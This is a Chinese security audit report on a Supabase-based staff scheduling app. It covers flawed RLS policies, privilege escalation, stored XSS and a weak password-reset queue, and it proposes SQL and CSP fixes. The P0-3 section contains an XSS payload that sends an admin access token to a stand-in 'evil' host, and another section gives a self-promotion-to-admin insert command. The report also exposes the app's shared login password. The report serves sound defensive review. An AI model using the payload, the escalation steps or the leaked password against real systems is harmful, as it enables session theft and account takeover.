# 对抗性安全审查报告 · v167

> 审查视角：攻击者 / 批判性工程师。不信任注释，直接读代码 + RLS 策略验证。
> 审查范围：`index.html` / `login.html` / `js/auth-guard.js` / `js/supabase-client.js` / `js/pages.js` / `js/app.js` / `supabase/*.sql`
> 审查日期：2026-08-03（当前线上 = v167）
> 前置参考：本仓库已有的 `adversarial-review.md`（v152 审查）。本报告在其基础上**复核旧问题是否修复 + 发现 v152 之后新引入的漏洞**。

---

## 总评

**一句话结论：系统的安全模型是"客户端信任 + 全库可写"，在攻击者拿到任意一个兼职账号后（共享口令 + 可预测邮箱，几乎零成本）即可彻底摧毁或伪造全店数据，并通过存储型 XSS 窃取管理员会话令牌。v152 审查指出的两个 P0（RLS 全员可写、并发无锁）到 v167 仍未修复，且 v166 的密码重置队列、v167 的渲染层又各自引入了新攻击面。**

严重程度分布：**3 个 P0（全为高危可利用）、4 个 P1、3 个 P2、1 个 P3**。其中 P0-1（blob 全写）、P0-2（RLS 缺 WITH CHECK 自提权）、P0-3（无 CSP 的存储型 XSS）构成一条完整利用链：

> 拿到任意兼职账号 → 直接 `upsert` 整个 `app_data` blob（P0-1）→ 在 `staff` 表 `INSERT` 自己为 `role='admin'`（P0-2）→ 在 `name`/`note` 字段注入 `<img src=x onerror=...>`（P0-3）→ 管理员任意页面加载全局 banner 时脚本执行 → 读取 `AuthHelper.session.access_token` 并代管理员操作。

---

## 🔴 P0-1：`app_data` blob 任意已登录账号可整体覆盖写（旧 P0-1，仍未修）

**证据**
- `supabase/sync_table.sql:25-28`：`app_data_authed_rw FOR ALL USING (auth.role() = 'authenticated')` —— 只判断"是否登录"，**无任何行/字段/写入者限制**。
- `js/supabase-client.js:528-539`：`SbClient.appData.save(blob, by)` 直接 `upsert` 整包，前端所有同步走这里。
- `supabase/auth_setup.sql:160-170` 的"清除旧策略"循环会 `DROP` 全部 policy，但**重建时只覆盖 staff/availability/循环表，`app_data` 不在其列** → 线上 `app_data` 实际生效的就是 sync_table 那条 `authenticated`-all 策略（可由"同步功能正常工作的现网事实"反推确认）。

**影响**：22 个登录账号（15 兼职 + 6 仓库 + 1 admin）**每一个**都能通过 Supabase API 直接 `from('app_data').update({data: 任意})`，把全店所有人的排班 / 考勤 / 业绩 / 评分 / 好评一次性整体覆盖或清空。无行级隔离、无写入者白名单。

**利用成本**：共享初始口令 `Salomon2026!`（`login.html:226/242`）写在登录页，邮箱规则为 `拼音@salomon.temp`，社工/爆破成本极低。

---

## 🔴 P0-2：`staff` / `availability` 等表 RLS 缺 `WITH CHECK` → 任意已登录用户可自提权为 admin、可注入任意数据（v166/v167 仍存在的架构缺陷，本次审查新确认）

**证据**
- `supabase/auth_setup.sql:174-177`：`staff_admin_all FOR ALL USING (EXISTS (SELECT 1 FROM staff s WHERE s.auth_id = auth.uid() AND s.role='admin'))` —— **只有 `USING`，没有 `WITH CHECK`**。
- `supabase/fix_rls_recursion.sql:62-63`：`staff_admin_all FOR ALL USING (public.is_admin())` —— 同样**没有 `WITH CHECK`**。
- `fix_rls_recursion.sql:74-77`：`avail_write_self FOR ALL USING (COALESCE(staff_auth_id, current_staff_auth_id()) = auth.uid())` —— 也是只有 `USING`。

**PostgreSQL 语义要点**：`FOR ALL USING (expr)` 策略中，
- 对 `SELECT`/`DELETE`：检查 `USING(expr)` 作用于已有行；
- 对 `INSERT`：**`USING` 不生效，且未写 `WITH CHECK` 时默认等于 `WITH CHECK (true)`** → **任何已登录用户都能 INSERT 任意行**；
- 对 `UPDATE`：仅 `USING` 检查旧行，`WITH CHECK`（无）默认放行 → 可把"自己可见的行"改成任意值。

**利用路径**
1. 兼职账号登录后，控制台执行 `from('staff').insert({ name:'x', auth_id: <自己的uid>, role:'admin' })` → 因 INSERT 不受 `USING` 限制，**直接写入一条 role=admin 的自己**；
2. 下次 `AuthHelper.init()`（`auth-guard.js:25-29`）按 `auth_id` 取 staff → `role='admin'` → `Auth.isAdmin` 为真（见 `index.html:294`）→ **前端 + 后台全管理员权限**；
3. 同理 `availability` 表可被任意 INSERT 伪造排班记录。

> 这是 v152 审查**没抓到**的新漏洞：那时只看了 `app_data`（P0-1），没审计子表的 `WITH CHECK` 缺失。它独立构成提权，且与 P0-1 叠加后无需改写 blob 即可获得 admin。

---

## 🔴 P0-3：存储型 XSS（无 CSP）→ 管理员会话令牌可被窃取（本次审查新发现）

**证据（未转义的用户数据进入 innerHTML）**
- `index.html:316-319`：**全局用户 banner**，`displayName`（= staff 姓名，来自 DB）直接 `${displayName}` 进 `banner.innerHTML` —— **每个页面加载即渲染**，是覆盖面最广的接收点；
- `js/pages.js:1264`：供班总览 `<td>${note}</td>` —— `note` 是兼职自己填的可用性备注，原始插值；
- `js/pages.js:5072`：日历单元格 `${noteDisplay}` —— 同上；
- `js/pages.js:3645 / 4265`：人员/排行榜 `${name}` 直接进文本节点。

**对比**：评论片段（snippet）已用 `_esc()`（`pages.js:223` 定义，63 处使用），但 `name` / `note` 在供班总览、日历、人员榜等多处**未转义**。

**无 CSP**：全仓库 `grep content-security-policy` 为空 → 没有任何 `script-src` 限制，注入的 `<img src=x onerror=...>` / `<script>` 会原样执行。

**利用链（高危）**
1. 攻击者借 P0-1 写权（或 P0-2 自提权后）把某条 `staff.name` 或某月 `availability.note` 改成 `<img src=x onerror="fetch('https://evil/?t='+AuthHelper.session.access_token)">`；
2. 管理员打开任意页面 → 全局 banner 渲染该姓名（或供班总览渲染该 note）→ 脚本在管理员浏览器执行；
3. 管理员的 Supabase `access_token`（`auth-guard.js:135-137` `getAccessToken` 直接暴露）被外传 → 攻击者以此令牌代管理员调用 Supabase（含 admin-only 表），完成权限横向移动。

---

## 🟠 P1-1：密码重置申请队列表 `password_reset_requests` RLS 过宽（v166 新引入）

**证据** `supabase/password_reset_requests.sql`：
- `:29-31` `anon_insert_reset_requests FOR INSERT TO anon WITH CHECK (true)` —— **未登录用户**（anon）可 INSERT，且 `WITH CHECK(true)` 允许写入**任意列**，包括 `status='done'`、`handled_by`、`note`；
- `:41-44` `authenticated_update_reset_requests FOR UPDATE TO authenticated USING(true) WITH CHECK(true)` —— **任意已登录用户**可改**任意**申请行。

**影响**
1. 队列投毒：攻击者（甚至不登录）插入 `status='done'` 的假请求，或把真实请求的 `handled_by` 改成自己名字；
2. 刷量 / DoS：anon 无频率限制，可无限 INSERT 干扰管理员；
3. 冒用：以他人邮箱提交申请（骚扰 / 误导管理员）；
4. 越权修改：非管理员也能把别人的请求标为已处理或注入 `note`。

**修复**：INSERT 限制 `WITH CHECK (status='pending' AND handled_at IS NULL AND handled_by IS NULL AND note IS NULL)`；UPDATE 限 `EXISTS(SELECT 1 FROM staff WHERE auth_id=auth.uid() AND role='admin')`；可考虑对 anon 加速率/验证码（前端层无法强制，需在 Edge Function 或后台处理）。

---

## 🟠 P1-2：客户端 admin 判定可被 `sessionStorage` 伪造（降级路径）

**证据** `js/auth-guard.js:51-60`：若 `AuthHelper.init()` 失败（如 Supabase 不可达），读 `sessionStorage.auth`，只要 `{authenticated:true}` 或 `{role:'admin'}` 即视为已登录/管理员。`index.html:284-288` 同样把 `sessionStorage.auth` 直接作为 `_data`。

**影响**：普通用户可在控制台 `sessionStorage.setItem('auth', JSON.stringify({role:'admin',...}))` 后刷新，获得 admin UI（删除按钮、重置卡等）。**实际数据破坏力有限**（因真权限在 RLS，且 RLS 当前是全开），但属于认证绕过，且与 P0-1/P0-2 叠加会放大危害。属于"纵深防御缺失"。

---

## 🟠 P1-3 / P1-4 / P1-5：v152 已列、v167 仍未修的数据一致性/可恢复性问题

- **P1-3 并发 last-write-wins 无乐观锁**（`supabase-client.js:528` 的 `appData.save` 是裸 `upsert`，无 `updated_at` WHERE 条件、无重试）。多人同时改 → 后写覆盖先写，高峰期必丢数据。
- **P1-4 离线改动重连后被静默丢弃**：`Store.set` 只写 LocalStorage（`app.js`），`Sync.push` 失败仅 `console.warn`，无 `pendingWrites` 队列，重连先 pull 后无"把本地未推送改动推上去"的步骤。
- **P1-5 完全无审计日志 + 无快照**：`app_data.updated_by` 只记最后推的人且可被伪造；误操作 / 被盗覆盖**不可追溯、不可回滚**（v167 的洁癖脚本虽快照到 `cleanup_backup_v4`，但那只是手动跑一次，不是常态备份）。

---

## 🟡 P2-1：RLS 策略来源混乱，存在"全开放"版本（需立即核对线上真实状态）

**证据**：仓库内 4 份 SQL 对 RLS 定义互相矛盾——
- `supabase/schema.sql:316-348`：`anon_all_*` 系列 `FOR ALL`（实质 `USING(true)`）→ **anon 也能读写全表**；
- `supabase/sync_table.sql:27`：`app_data` 为 `authenticated`-all；
- `supabase/auth_setup.sql:174-216` 与 `supabase/fix_rls_recursion.sql:62-97`：admin 写 / 登录读（较严，但 staff/availability 缺 WITH CHECK，见 P0-2）。

**风险**：不清楚哪份在线上最终生效。`app_data` 在 auth_setup/fix_rls 的"清旧策略"循环里被 DROP 后**未被重新创建专属策略**，最终是 sync_table 那条。建议管理员立刻在 SQL Editor 跑：
```sql
SELECT tablename, policyname, cmd, qual, with_check
FROM pg_policies WHERE schemaname='public' ORDER BY tablename, policyname;
```
把实际生效策略贴回来，据此定稿一份"唯一真相" RLS 脚本（删掉 schema.sql 的 `anon_all_*` 分支）。

---

## 🟡 P2-2：共享口令 + 可预测邮箱 + anon key 入库

- `Salomon2026!` 明文写在 `login.html`，全员共用 → 无个人问责，任一人泄露即全员失守；
- 邮箱 `拼音@salomon.temp` 可枚举；
- `supabase/*.key` 以 anon JWT 形式落在仓库（虽 anon 设计公开，但 `service_role.key` 误存为 anon 的事实说明密钥管理混乱，见 `adversarial-review.md`）。

---

## 🟢 P3：死代码 `SbAPI` 表级封装可从浏览器控制台直接调用

`js/supabase-client.js:118-562` 定义了一整套 `upsertStaff/deleteStaff/upsertAvailability/...` 表级封装，但前端**只有 `appData.get/save` 被调用**（`sync.js:343/370/381`）。这些封装暴露在 `window.SbClient` 上，攻击者在控制台可直接调用。当前靠 RLS 兜底；一旦 RLS 按本报告收紧（admin-only 写），它们自然无害，但属于"不应存在的攻击面"，建议移除或改为内部模块不挂全局。

---

## 修复路线（按优先级）

### 短期（必须，上线前）
1. **收紧 `app_data` RLS 到 admin-only 写**：
   ```sql
   DROP POLICY IF EXISTS "app_data_authed_rw" ON public.app_data;
   CREATE POLICY "app_data_admin_write" ON public.app_data
     FOR ALL USING (public.is_admin()) WITH CHECK (public.is_admin());
   -- 兼职仍需读（前端渲染依赖）：
   CREATE POLICY "app_data_authed_read" ON public.app_data
     FOR SELECT USING (auth.uid() IS NOT NULL);
   ```
2. **给 staff / availability 策略补 `WITH CHECK`**（消灭 P0-2）：
   ```sql
   -- staff：仅 admin 可改，且禁止任何人把 role 改成 admin（除非本人已是 admin）
   CREATE POLICY "staff_admin_all" ON public.staff
     FOR ALL USING (public.is_admin()) WITH CHECK (public.is_admin());
   CREATE POLICY "staff_self_update" ON public.staff
     FOR UPDATE USING (auth_id = auth.uid())
     WITH CHECK (auth_id = auth.uid() AND role = (SELECT role FROM public.staff WHERE auth_id = auth.uid()));
   -- availability：写自己 + admin
   CREATE POLICY "avail_write_self" ON public.availability
     FOR ALL USING (COALESCE(staff_auth_id, public.current_staff_auth_id()) = auth.uid())
     WITH CHECK (COALESCE(staff_auth_id, public.current_staff_auth_id()) = auth.uid());
   ```
3. **全量转义 `name` / `note` / `displayName`**：把 `pages.js` 中 `${note}` `${name}` 与 `index.html` banner 的 `${displayName}` 全部改为 `_esc(...)`；并加 **CSP** `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'">`（保留内联 style 兼容性，禁 inline script/event-handler）。
4. **收紧 `password_reset_requests` RLS**（见 P1-1 修复）。

### 中期（下个迭代）
5. `appData.save` 加 `updated_at` 乐观锁 + 冲突重试（P1-3）；
6. `pendingWrites` 离线队列 + 重连重推（P1-4）；
7. `change_log` 审计表 + 每日 `app_data` 快照（P1-5）；
8. 每人独立口令 / 关闭共享口令（P2-2）；
9. 清理 `SbAPI` 死代码（P3）；定稿唯一 RLS 脚本（P2-1）。

---

## 待办清单（建议管理员执行）

- [ ] **P0-1** `app_data` RLS 收紧为 admin-only 写 + 登录读
- [ ] **P0-2** staff/availability 补 `WITH CHECK`（禁止自提权）
- [ ] **P0-3** 全量 `_esc(name/note/displayName)` + 加 CSP
- [ ] **P1-1** `password_reset_requests` RLS 收窄（INSERT 限 pending、UPDATE 限 admin）
- [ ] **P1-2** 移除/加固 sessionStorage 降级信任（或登录失败时不回退为已登录）
- [ ] **P1-3/4/5** 乐观锁 / 离线队列 / 审计快照
- [ ] **P2-1** 跑 `pg_policies` 核对线上真实策略，定稿唯一 RLS 脚本
- [ ] **P2-2** 取消共享口令，改每人独立
- [ ] **P3** 移除暴露的 `SbAPI` 表级封装

> 注：以上 SQL 修复均需管理员在 Dashboard → SQL Editor 执行（anon key 无写权限，与历史一致）。修复后所有设备退登清缓存重登。
